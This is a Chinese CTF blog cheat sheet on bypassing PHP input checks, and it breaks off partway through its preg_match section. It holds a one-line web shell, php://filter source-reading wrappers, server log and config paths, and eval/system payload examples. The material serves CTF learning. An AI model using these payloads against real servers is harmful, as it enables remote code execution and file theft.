<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>PHPç»•è¿‡ | Lazzaro</title><meta name="description" content="å¸¸ç”¨å‡½æ•°phpinfo()    #PHPé…ç½®é¡µ file_get_contents()    #è·å–æ–‡ä»¶å†…å®¹ get_defined_vars()    #è·å–æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬åŒ…å«çš„æ–‡ä»¶ï¼‰å˜é‡çš„å€¼ â€‹     å˜ç§ä¸€å¥è¯PHP $_GET[a]($_GET[b]); â€‹     å¸¸ç”¨php:&#x2F;&#x2F;filterè¿‡æ»¤å™¨ æ— è¿‡æ»¤å™¨ php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;  å­—ç¬¦ä¸²è¿‡æ»¤å™¨ php:&#x2F;&#x2F;"><meta property="og:type" content="article"><meta property="og:title" content="PHPç»•è¿‡"><meta property="og:url" content="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="å¸¸ç”¨å‡½æ•°phpinfo()    #PHPé…ç½®é¡µ file_get_contents()    #è·å–æ–‡ä»¶å†…å®¹ get_defined_vars()    #è·å–æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬åŒ…å«çš„æ–‡ä»¶ï¼‰å˜é‡çš„å€¼ â€‹     å˜ç§ä¸€å¥è¯PHP $_GET[a]($_GET[b]); â€‹     å¸¸ç”¨php:&#x2F;&#x2F;filterè¿‡æ»¤å™¨ æ— è¿‡æ»¤å™¨ php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;  å­—ç¬¦ä¸²è¿‡æ»¤å™¨ php:&#x2F;&#x2F;"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2020-05-18T11:29:09.000Z"><meta property="article:modified_time" content="2022-01-03T05:04:08.297Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="ç»•è¿‡"><meta property="article:tag" content="PHP"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFå¼±é¸¡è‡ªè¿›é˜¶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="æœç´¢"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">æ€»è§ˆ</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">æ±‡æ€»</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">ç±»åˆ«</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">å…³é”®è¯</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">æ¥ç•™ä¸ªè¨€ ğŸ‘‰ğŸ‘‰ğŸ‘‰</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">ç±»åˆ«</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">29</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">16</span></li></ul></div></div><div class="widget"><h3 class="widget-title">å…³é”®è¯äº‘</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020èµ›</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.8px">2021èµ›</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.4px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.2px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/node-js/" style="font-size:13px">node.js</a> <a href="/tags/nodejs/" style="font-size:13px">nodejs</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.6px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">å†…ç½‘</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">ååºåˆ—åŒ–</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">åç¼–è¯‘</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">åè°ƒè¯•</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">å–è¯</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">å‘½ä»¤è¡Œ</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">å›¾åƒ</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">å—å¯†ç </a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.2px">å¯†ç </a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">ææƒ</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">æ–‡ä»¶ä¸Šä¼ </a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">æ›²çº¿</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">æ ¼å¯†ç </a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">æ³¨å…¥</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">æµå¯†ç </a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">æµé‡</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">æ¸—é€</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">ç¦»æ•£å¯¹æ•°</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.2px">ç®—æ³•</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.6px">ç»•è¿‡</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">ç¼–ç </a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.2px">è„šæœ¬</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">è‡ªåŠ¨åŒ–</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">é€ƒé€¸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.4px">éšå†™</a></div></div><div class="widget"><h3 class="widget-title">æ±‡æ€»</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">åäºŒæœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">åä¸€æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">åæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">ä¹æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">å…«æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">å…­æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">äº”æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">å››æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">äºŒæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">ä¸€æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">åäºŒæœˆ 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">åä¸€æœˆ 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">åæœˆ 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">ä¹æœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">å…«æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">ä¸ƒæœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">å…­æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">äº”æœˆ 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">æ–‡ç« ç›®å½•</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">å¸¸ç”¨å‡½æ•°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E7%A7%8D%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">2.</span> <span class="toc-text">å˜ç§ä¸€å¥è¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8php-filter%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">å¸¸ç”¨php:&#x2F;&#x2F;filterè¿‡æ»¤å™¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84"><span class="toc-number">4.</span> <span class="toc-text">å¸¸ç”¨è·¯å¾„</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA"><span class="toc-number">5.1.</span> <span class="toc-text">æº¢å‡º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intval"><span class="toc-number">5.2.</span> <span class="toc-text">intval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-numeric"><span class="toc-number">5.3.</span> <span class="toc-text">is_numeric()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-match"><span class="toc-number">5.4.</span> <span class="toc-text">preg_match()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#in-array"><span class="toc-number">5.5.</span> <span class="toc-text">in_array()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER-%E2%80%98QUERY-STRING%E2%80%99"><span class="toc-number">5.6.</span> <span class="toc-text">$_SERVER[â€˜QUERY_STRINGâ€™]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REQUEST"><span class="toc-number">5.7.</span> <span class="toc-text">$_REQUEST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents"><span class="toc-number">5.8.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-put-contents"><span class="toc-number">5.9.</span> <span class="toc-text">file_put_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sha1-%E6%AF%94%E8%BE%83"><span class="toc-number">5.10.</span> <span class="toc-text">sha1()æ¯”è¾ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-%E6%AF%94%E8%BE%83"><span class="toc-number">5.11.</span> <span class="toc-text">md5()æ¯”è¾ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-function"><span class="toc-number">5.12.</span> <span class="toc-text">create_function()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-user-func"><span class="toc-number">5.13.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellarg"><span class="toc-number">5.14.</span> <span class="toc-text">escapeshellarg()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ereg-eregi"><span class="toc-number">5.15.</span> <span class="toc-text">ereg() &#x2F; eregi()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos"><span class="toc-number">5.16.</span> <span class="toc-text">strpos()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strcmp"><span class="toc-number">5.17.</span> <span class="toc-text">strcmp()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add-slashes"><span class="toc-number">5.18.</span> <span class="toc-text">add_slashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace"><span class="toc-number">5.19.</span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter-var"><span class="toc-number">5.20.</span> <span class="toc-text">filter_var()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-file-file-exists"><span class="toc-number">5.21.</span> <span class="toc-text">is_file() &#x2F; file_exists()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">5.22.</span> <span class="toc-text">include() ï¼ˆæ–‡ä»¶åŒ…å«ï¼‰</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#die-exit"><span class="toc-number">5.23.</span> <span class="toc-text">die() &#x2F; exit()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open"><span class="toc-number">5.24.</span> <span class="toc-text">open()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-url"><span class="toc-number">5.25.</span> <span class="toc-text">parse_url()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basename"><span class="toc-number">5.26.</span> <span class="toc-text">basename()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-number">5.27.</span> <span class="toc-text">å‚æ•°ç‰¹æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D-%E6%95%B0%E5%AD%97-%E7%89%B9%E5%AE%9A%E7%AC%A6%E5%8F%B7RCE"><span class="toc-number">5.28.</span> <span class="toc-text">æ— å­—æ¯&#x2F;æ•°å­—&#x2F;ç‰¹å®šç¬¦å·RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0-%E5%B8%A6%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.29.</span> <span class="toc-text">æ— å‚æ•°&#x2F;å¸¦å‚æ•°RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0"><span class="toc-number">5.29.1.</span> <span class="toc-text">æ— å‚å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A5%97%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%88%E6%9C%89%E5%8F%82%EF%BC%89"><span class="toc-number">5.29.2.</span> <span class="toc-text">å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.29.3.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E7%9B%AE%E5%BD%95"><span class="toc-number">5.30.</span> <span class="toc-text">åˆ—ç›®å½•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">5.31.</span> <span class="toc-text">è¯»æ–‡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E7%B1%BB%E4%BF%A1%E6%81%AF"><span class="toc-number">5.32.</span> <span class="toc-text">è¯»ç±»ä¿¡æ¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-disable-function"><span class="toc-number">5.33.</span> <span class="toc-text">bypass disable_function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-open-basedir"><span class="toc-number">5.34.</span> <span class="toc-text">bypass open_basedir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">5.35.</span> <span class="toc-text">é•¿åº¦é™åˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.36.</span> <span class="toc-text">ä¸­é—´ä»¶æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache"><span class="toc-number">5.36.1.</span> <span class="toc-text">Apache</span></a></li></ol></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-web-PHPç»•è¿‡" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">PHPç»•è¿‡</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/" class="article-date"><time datetime="2020-05-18T11:29:09.000Z" itemprop="datePublished">2020-05-18</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/web/">web</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/PHP/" rel="tag">PHP</a>, <a class="article-tag-link-link" href="/tags/%E7%BB%95%E8%BF%87/" rel="tag">ç»•è¿‡</a> </span><span class="article-read hidden-xs"><i class="icon icon-eye-fill" aria-hidden="true"></i> <span id="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/" class="leancloud_visitors" data-flag-title="PHPç»•è¿‡"><span class="leancloud-visitors-count">âˆ</span> </span></span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/#comments" class="article-comment-link">è¯„è®º</a></span></div></div><div class="article-entry marked-body" itemprop="articleBody"><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><p>phpinfo() #PHPé…ç½®é¡µ</p><p>file_get_contents() #è·å–æ–‡ä»¶å†…å®¹</p><p>get_defined_vars() #è·å–æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬åŒ…å«çš„æ–‡ä»¶ï¼‰å˜é‡çš„å€¼</p><p>â€‹</p><h2 id="å˜ç§ä¸€å¥è¯"><a href="#å˜ç§ä¸€å¥è¯" class="headerlink" title="å˜ç§ä¸€å¥è¯"></a>å˜ç§ä¸€å¥è¯</h2><p><strong>PHP</strong></p><p><code>$_GET[a]($_GET[b]);</code></p><p>â€‹</p><h2 id="å¸¸ç”¨php-filterè¿‡æ»¤å™¨"><a href="#å¸¸ç”¨php-filterè¿‡æ»¤å™¨" class="headerlink" title="å¸¸ç”¨php://filterè¿‡æ»¤å™¨"></a>å¸¸ç”¨php://filterè¿‡æ»¤å™¨</h2><ul><li><p><strong>æ— è¿‡æ»¤å™¨</strong></p><p><code>php://filter/resource=</code></p></li><li><p><strong>å­—ç¬¦ä¸²è¿‡æ»¤å™¨</strong></p><p><code>php://filter/read=string.rot13/resource=</code></p><p><code>php://filter/read=string.toupper/resource=</code></p><p><code>php://filter/read=string.tolower/resource=</code></p><p><code>php://filter/read=string.string_tags/resource=</code></p></li><li><p><strong>è½¬æ¢è¿‡æ»¤å™¨</strong></p><p><code>php://filter/read=convert.base64-encode/resource=</code></p><p><code>php://filter/read=convert.quoted-printable-encode/resource=</code></p></li></ul><p>â€‹</p><h2 id="å¸¸ç”¨è·¯å¾„"><a href="#å¸¸ç”¨è·¯å¾„" class="headerlink" title="å¸¸ç”¨è·¯å¾„"></a>å¸¸ç”¨è·¯å¾„</h2><ul><li><p><strong>Nginx</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—ï¼š</span><br><span class="line">/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">é…ç½®ï¼š</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p><strong>Apache</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—ï¼š</span><br><span class="line">/var/log/apache/access.log</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/www/logs/access.log</span><br><span class="line">/var/log/access.log</span><br><span class="line">/etc/httpd/logs/access_log</span><br><span class="line">/var/log/httpd/access_log</span><br><span class="line"></span><br><span class="line">é…ç½®ï¼š</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure></li></ul><p>â€‹</p><h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="æº¢å‡º"><a href="#æº¢å‡º" class="headerlink" title="æº¢å‡º"></a>æº¢å‡º</h3><p>32ä½ï¼š-2147483648 ~ 2147483647</p><p>64ä½ï¼š-9223372036854775808 ~ 9223372036854775807</p><h3 id="intval"><a href="#intval" class="headerlink" title="intval()"></a>intval()</h3><ol><li><p>è¿›åˆ¶è½¬æ¢</p><p>åå…­è¿›åˆ¶ï¼š0x???</p><p>äºŒè¿›åˆ¶ï¼š0b???</p><p>å…«è¿›åˆ¶ï¼š0???</p></li></ol><h3 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h3><ol><li><p>ç‰¹æ®Šå­—ç¬¦</p><p>ç©ºæ ¼ã€%00ã€%0a</p></li></ol><h3 id="preg-match"><a href="#preg-match" class="headerlink" title="preg_match()"></a>preg_match()</h3><ol><li><p>æ¢è¡Œç¬¦ %0aï¼ˆæŒ‰è¡ŒåŒ¹é…ç±»ï¼‰</p><p>preg_matchå€¼åªåŒ¹é…ç¬¬ä¸€è¡Œï¼Œå¯¹äº<code>/^xxx$/</code>ç±»å‹ï¼Œåœ¨å‰ç«¯æˆ–æœ«å°¾åŠ ä¸Š%0aå³å¯ç»•è¿‡ã€‚</p></li><li><p>å‘½åç©ºé—´ï¼ˆ\ï¼‰</p><blockquote><p>åœ¨PHPçš„å‘½åç©ºé—´é»˜è®¤ä¸º<code>\</code>ï¼Œæ‰€æœ‰çš„å‡½æ•°å’Œç±»éƒ½åœ¨<code>\</code>è¿™ä¸ªå‘½åç©ºé—´ä¸­ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼›è€Œå¦‚æœå†™\function_name() è¿™æ ·è°ƒç”¨å‡½æ•°ï¼Œåˆ™å…¶å®æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå°±å¿…é¡»å†™ç»å¯¹è·¯å¾„è¿™ç§å†™æ³•ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä¾‹</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">namespace</span> <span class="title">ccc</span>;\<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span> \system(<span class="string">&#x27;cat /tmp/flag_XXXX&#x27;</span>);</span><br></pre></td></tr></table></figure></blockquote><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-é¢˜è§£-å­¦ä¹ ç¯‡/#function">Code-Breaking Puzzles é¢˜è§£&amp;å­¦ä¹ 